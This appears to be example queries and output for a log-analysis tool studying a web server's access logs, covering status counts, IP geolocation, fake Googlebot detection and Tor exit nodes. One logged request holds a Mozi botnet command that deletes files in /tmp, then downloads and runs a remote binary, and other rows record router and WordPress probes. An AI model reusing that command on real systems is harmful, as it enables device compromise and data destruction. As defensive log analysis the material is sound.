# query_hits_by_status_range.sx
```jsx
@[./view/view_default.sx]
| select(
  day:timestamp[1 day],
  total:count(*),
  status_200:count(response=200),
  status_1xx:count(response between 100 and 199),
  status_2xx:count(response between 200 and 299),
  status_3xx:count(response between 300 and 399),
  status_4xx:count(response between 400 and 499),
  status_5xx:count(response between 500 and 599)
)
| group(day)
| select(*, fail_4xx_ratio:ROUND(10000.0*status_4xx/total)/100.0)
```

| day                             | total | status_200 | status_1xx | status_2xx | status_3xx | status_4xx | status_5xx | fail_4xx_ratio |
|---------------------------------|------:|-----------:|-----------:|-----------:|-----------:|-----------:|-----------:|---------------:|
| `2020‑06‑01 00:00:00.000 +0300` |    70 |         44 |          0 |         44 |          0 |         26 |          0 |          37.14 |
| `2020‑06‑02 00:00:00.000 +0300` |   148 |         99 |          0 |         99 |          0 |         49 |          0 |          33.11 |
| `2020‑06‑03 00:00:00.000 +0300` |   114 |         88 |          0 |         88 |          0 |         26 |          0 |          22.81 |
| `2020‑06‑04 00:00:00.000 +0300` |  1091 |         80 |          0 |         80 |          0 |       1010 |          1 |          92.58 |
| `2020‑06‑05 00:00:00.000 +0300` |  1098 |        101 |          0 |        101 |          0 |        996 |          1 |          90.71 |
| `2020‑06‑06 00:00:00.000 +0300` |   132 |         63 |          0 |         63 |          0 |         69 |          0 |          52.27 |
| `2020‑06‑07 00:00:00.000 +0300` |   162 |         90 |          0 |         90 |          0 |         72 |          0 |          44.44 |
| `2020‑06‑08 00:00:00.000 +0300` |   160 |         85 |          0 |         85 |          1 |         74 |          0 |          46.25 |
| `2020‑06‑09 00:00:00.000 +0300` |  1079 |         86 |          0 |         86 |          1 |        992 |          0 |          91.94 |
| `2020‑06‑10 00:00:00.000 +0300` |   118 |         90 |          0 |         90 |          0 |         28 |          0 |          23.73 |
| `2020‑06‑11 00:00:00.000 +0300` |   184 |         99 |          0 |         99 |          0 |         85 |          0 |           46.2 |
...

# query_clientip_metainfo.sx
```jsx
@[./view/view_default.sx]
| select(clientIp, cc(clientIp), asname(clientIp), geo(clientIp), *)
```

| clientIp          | cc | asname                          | geo               | host            | ident  | auth   | timestamp                       | verb | uri                                                                                           | httpversion | invalidRequest | response | bytes | referrer                  | agent                                                                                                               | extra  |
|-------------------|----|---------------------------------|-------------------|-----------------|--------|--------|---------------------------------|------|-----------------------------------------------------------------------------------------------|------------:|----------------|---------:|------:|---------------------------|---------------------------------------------------------------------------------------------------------------------|--------|
| `96.126.103.73`   | US | AS63949 Linode, LLC             | 37.5625,‑122.0004 | 96.126.103.73   | *null* | *null* | `2020‑06‑01 06:22:30.000 +0300` | GET  | /                                                                                             |         1.1 | *null*         |      200 |   238 | ‑                         | Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36      | *null* |
| `134.119.218.243` | DE | AS29066 Host Europe GmbH        | 51.2993,9.491     | 134.119.218.243 | *null* | *null* | `2020‑06‑01 07:01:30.000 +0300` | GET  | /                                                                                             |         1.1 | *null*         |      200 |   257 | http://www.ifconfig.co.uk | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36       | *null* |
| `162.243.143.216` | US | AS14061 DIGITALOCEAN‑ASN        | 37.7353,‑122.3732 | 162.243.143.216 | *null* | *null* | `2020‑06‑01 07:42:43.000 +0300` | GET  | /manager/text/list                                                                            |         1.1 | *null*         |      404 |   437 | ‑                         | Mozilla/5.0 zgrab/0.x                                                                                               | *null* |
| `134.119.218.243` | DE | AS29066 Host Europe GmbH        | 51.2993,9.491     | 134.119.218.243 | *null* | *null* | `2020‑06‑01 07:52:36.000 +0300` | GET  | /                                                                                             |         1.1 | *null*         |      200 |   257 | http://www.ifconfig.co.uk | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36       | *null* |
| `185.172.111.210` | NL | AS206898 Server Hosting Pty Ltd | 52.3824,4.8995    | 185.172.111.210 | *null* | *null* | `2020‑06‑01 08:05:34.000 +0300` | POST | /GponForm/diag_Form?style/                                                                    |         1.1 | *null*         |      404 |  1989 | ‑                         | curl/7.3.2                                                                                                          | *null* |
| `223.149.176.156` | CN | AS4134 Chinanet                 | 25.2239,112.1703  | 223.149.176.156 | *null* | *null* | `2020‑06‑01 08:10:23.000 +0300` | GET  | /shell?cd+/tmp;rm+‑rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws |         1.1 | *null*         |      404 |   493 | ‑                         | Hello, world                                                                                                        | *null* |
| `167.172.30.56`   | US | AS14061 DIGITALOCEAN‑ASN        | 40.8364,‑74.1403  | 167.172.30.56   | *null* | *null* | `2020‑06‑01 08:29:40.000 +0300` | GET  | /                                                                                             |         1.0 | *null*         |      200 |   257 | ‑                         | Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)                                               | *null* |
| `128.14.134.134`  | CN | AS21859 ZNET                    | 34.7725,113.7266  | 128.14.134.134  | *null* | *null* | `2020‑06‑01 08:52:27.000 +0300` | GET  | /                                                                                             |         1.1 | *null*         |      200 |   238 | ‑                         | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 | *null* |
| `198.20.103.178`  | NL | AS32475 SINGLEHOP‑LLC           | 52.3521,4.9138    | 198.20.103.178  | *null* | *null* | `2020‑06‑01 08:54:13.000 +0300` | GET  | /                                                                                             |         1.1 | *null*         |      200 |  1489 | ‑                         | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 | *null* |
| `192.99.34.42`    | CA | AS16276 OVH SAS                 | 43.6319,‑79.3716  | 192.99.34.42    | *null* | *null* | `2020‑06‑01 09:01:02.000 +0300` | GET  | /wp‑login.php                                                                                 |         1.1 | *null*         |      400 |     0 | ‑                         | Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36       | *null* |
| `192.99.34.42`    | CA | AS16276 OVH SAS                 | 43.6319,‑79.3716  | 192.99.34.42    | *null* | *null* | `2020‑06‑01 09:01:14.000 +0300` | GET  | /robots.txt                                                                                   |         1.1 | *null*         |      400 |     0 | ‑                         | Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36       | *null* |
...

# query_top_countries.sx
```jsx
@[./view/view_default.sx]
| select(count(*), cc(clientIp))
| group(cc)
| sort(count desc)
```

| count | cc |
|------:|----|
|  4743 | CN |
|  4165 | US |
|  1937 | RU |
|  1837 | TW |
|  1115 | GB |
|  1053 | KR |
|  1028 | DE |
|   481 | NL |
|   423 | RO |
|   210 | PS |
|   198 | CH |
...

# query_find_fake_google_bots.sx
```jsx
@[./view/view_default.sx]
| select(ASN(clientIp), *)
| filter(  agent like '%Googlebot/%'
		or agent like 'AdsBot-Google/%'
		or agent like '%AdsBot-Google-Mobile;%'
		or agent like '%Google-Ads-Overview%'		
		)
| filter_out(asn = 15169)		
| select(asname(clientIp), geo(clientIp), cc(clientIp), agent, *)
```

| asname                      | geo            | cc | agent                                                                    |   asn | clientIp       | host         | ident  | auth   | timestamp                       | verb | uri      | httpversion | invalidRequest | response | bytes | referrer | extra  |
|-----------------------------|----------------|----|--------------------------------------------------------------------------|------:|----------------|--------------|--------|--------|---------------------------------|------|----------|------------:|----------------|---------:|------:|----------|--------|
| AS64425 SKB Enterprise B.V. | 52.3759,4.8975 | NL | Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) | 64425 | `5.182.210.16` | 5.182.210.16 | *null* | *null* | `2020‑08‑07 15:44:40.000 +0300` | GET  | /api.php |         1.1 | *null*         |      404 |   437 | ‑        | *null* |

# query_top_response_len.sx
```jsx
@[./view/view_default.sx]
| select(timestamp, clientIp, verb, bytes, uri, *)
| sort(bytes desc)
| limit(50)
```

| timestamp                       | clientIp         | verb   |      bytes | uri                    | host           | ident  | auth   | httpversion | invalidRequest | response | referrer | agent                                                                        | extra  |
|---------------------------------|------------------|--------|-----------:|------------------------|----------------|--------|--------|------------:|----------------|---------:|----------|------------------------------------------------------------------------------|--------|
| `2020‑06‑04 23:43:13.000 +0300` | `183.83.145.187` | GET    | 6529322873 | /secret1337/backup.tgz | 183.83.145.187 | *null* | *null* |         1.1 | *null*         |      200 | ‑        | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0 | *null* |
| `2020‑06‑13 20:36:48.000 +0300` | `172.105.89.161` | GET    |  239233441 | /secret1337/mysql.sql  | 172.105.89.161 | *null* | *null* |         1.1 | *null*         |      200 | ‑        | Mozilla/5.0 zgrab/0.x                                                        | *null* |
| `2020‑06‑25 20:22:14.000 +0300` | `217.18.21.2`    | *null* |       3681 | *null*                 | 217.18.21.2    | *null* | *null* |      *null* | ‑              |      408 | ‑        | ‑                                                                            | *null* |
| `2020‑06‑25 15:59:32.000 +0300` | `90.191.124.115` | *null* |       3665 | *null*                 | 90.191.124.115 | *null* | *null* |      *null* | ‑              |      408 | ‑        | ‑                                                                            | *null* |
| `2020‑08‑09 02:39:27.000 +0300` | `223.205.236.82` | *null* |       3665 | *null*                 | 223.205.236.82 | *null* | *null* |      *null* | ‑              |      408 | ‑        | ‑                                                                            | *null* |
| `2020‑08‑09 02:39:27.000 +0300` | `223.205.236.82` | *null* |       3665 | *null*                 | 223.205.236.82 | *null* | *null* |      *null* | ‑              |      408 | ‑        | ‑                                                                            | *null* |
| `2020‑06‑08 18:29:55.000 +0300` | `18.220.219.44`  | *null* |       3221 | *null*                 | 18.220.219.44  | *null* | *null* |      *null* | <br>           |      400 | ‑        | ‑                                                                            | *null* |
| `2020‑06‑08 18:29:55.000 +0300` | `18.220.219.44`  | *null* |       3218 | *null*                 | 18.220.219.44  | *null* | *null* |      *null* | <br>           |      400 | ‑        | ‑                                                                            | *null* |
| `2020‑06‑08 18:29:55.000 +0300` | `18.220.219.44`  | *null* |       3217 | *null*                 | 18.220.219.44  | *null* | *null* |      *null* | <br>           |      400 | ‑        | ‑                                                                            | *null* |
| `2020‑06‑08 18:29:55.000 +0300` | `18.220.219.44`  | *null* |       3217 | *null*                 | 18.220.219.44  | *null* | *null* |      *null* | <br>           |      400 | ‑        | ‑                                                                            | *null* |
| `2020‑06‑09 14:35:50.000 +0300` | `52.3.226.210`   | *null* |       3215 | *null*                 | 52.3.226.210   | *null* | *null* |      *null* | <br>           |      400 | ‑        | ‑                                                                            | *null* |
...

# join_with_tor_exit_nodes.sx
```jsx
@[./view/view_default.sx]
| leftjoin(@[../tor_exit_nodes/view_cached.sx] ON left.clientIp = right.tor_ip)
| filter(tor_ip is not null)
| select(tor_ip, tor_time, tor_id, *)
```

| tor_ip            | tor_time                        | tor_id                                   | clientIp          | host            | ident  | auth   | timestamp                       | verb | uri                       | httpversion | invalidRequest | response | bytes | referrer | agent                                                                                                              | extra  |
|-------------------|---------------------------------|------------------------------------------|-------------------|-----------------|--------|--------|---------------------------------|------|---------------------------|------------:|----------------|---------:|------:|----------|--------------------------------------------------------------------------------------------------------------------|--------|
| `185.220.102.6`   | `2020‑08‑12 13:23:50.000 +0300` | A2DB293FFC5A76A718863BF1AEDBC8DFB1CB1097 | `185.220.102.6`   | 185.220.102.6   | *null* | *null* | `2020‑06‑09 07:01:29.000 +0300` | POST | /cgi‑bin/mainfunction.cgi |         1.1 | *null*         |      404 |   437 | ‑        | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 | *null* |
| `185.220.102.6`   | `2020‑08‑12 12:57:46.000 +0300` | A2534EF23390CAE079B1586F0FDF9CE11F556062 | `185.220.102.6`   | 185.220.102.6   | *null* | *null* | `2020‑06‑09 07:01:29.000 +0300` | POST | /cgi‑bin/mainfunction.cgi |         1.1 | *null*         |      404 |   437 | ‑        | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 | *null* |
| `178.165.72.177`  | `2020‑08‑12 12:51:05.000 +0300` | 3994E734DCD794479D1A60F4ABD3FC91CAA395EE | `178.165.72.177`  | 178.165.72.177  | *null* | *null* | `2020‑06‑16 00:31:12.000 +0300` | GET  | /                         |         1.1 | *null*         |      200 |  1813 | ‑        | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36 | *null* |
| `178.165.72.177`  | `2020‑08‑12 12:51:05.000 +0300` | 3994E734DCD794479D1A60F4ABD3FC91CAA395EE | `178.165.72.177`  | 178.165.72.177  | *null* | *null* | `2020‑06‑16 00:31:12.000 +0300` | GET  | /                         |         1.1 | *null*         |      200 |   520 | ‑        | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36 | *null* |
| `185.220.101.203` | `2020‑08‑12 13:06:15.000 +0300` | C8F6F6C1834454F1E927A4A05E8E54EB623D4B73 | `185.220.101.203` | 185.220.101.203 | *null* | *null* | `2020‑06‑19 20:26:05.000 +0300` | GET  | /async/                   |         1.1 | *null*         |      404 |   493 | ‑        | Mozilla/5.0 (Windows ME 4.9; rv:31.0) Gecko/20100101 Firefox/31.7                                                  | *null* |
| `23.129.64.217`   | `2020‑08‑12 12:33:20.000 +0300` | D43EF31799FDCE5A235D1E76F4324C00F6804B05 | `23.129.64.217`   | 23.129.64.217   | *null* | *null* | `2020‑06‑27 22:11:47.000 +0300` | GET  | /                         |         1.1 | *null*         |      200 |   238 | ‑        | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 | *null* |
| `150.129.8.12`    | `2020‑08‑12 13:07:46.000 +0300` | 1970C3CE0F945DA0D16DF5191DC8B0483A421A75 | `150.129.8.12`    | 150.129.8.12    | *null* | *null* | `2020‑06‑30 07:21:02.000 +0300` | GET  | /                         |         1.0 | *null*         |      400 |     0 | ‑        | ‑                                                                                                                  | *null* |
| `150.129.8.27`    | `2020‑08‑12 12:35:07.000 +0300` | 5F1381FA3963CAAF712235CA34D6B15FDDF14966 | `150.129.8.27`    | 150.129.8.27    | *null* | *null* | `2020‑07‑01 23:29:12.000 +0300` | GET  | /                         |         1.0 | *null*         |      400 |     0 | ‑        | ‑                                                                                                                  | *null* |
| `145.239.91.37`   | `2020‑08‑12 13:22:12.000 +0300` | 96D4C61DB5B38EC7ABE3DB9BB87A97A8587B8087 | `145.239.91.37`   | 145.239.91.37   | *null* | *null* | `2020‑07‑02 14:14:32.000 +0300` | GET  | /                         |         1.0 | *null*         |      400 |     0 | ‑        | ‑                                                                                                                  | *null* |
| `23.129.64.205`   | `2020‑08‑12 13:23:55.000 +0300` | 6EEF8446BF9D43DA7F7D8505BDFC49BBE64BF822 | `23.129.64.205`   | 23.129.64.205   | *null* | *null* | `2020‑07‑03 07:25:48.000 +0300` | GET  | /                         |         1.1 | *null*         |      200 |   238 | ‑        | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 | *null* |
| `185.130.44.108`  | `2020‑08‑12 13:07:01.000 +0300` | D8A1F5A8EA1AF53E3414B9C48FE6B10C31ACC9B2 | `185.130.44.108`  | 185.130.44.108  | *null* | *null* | `2020‑07‑04 03:44:04.000 +0300` | GET  | /                         |         1.0 | *null*         |      400 |     0 | ‑        | ‑                                                                                                                  | *null* |
...
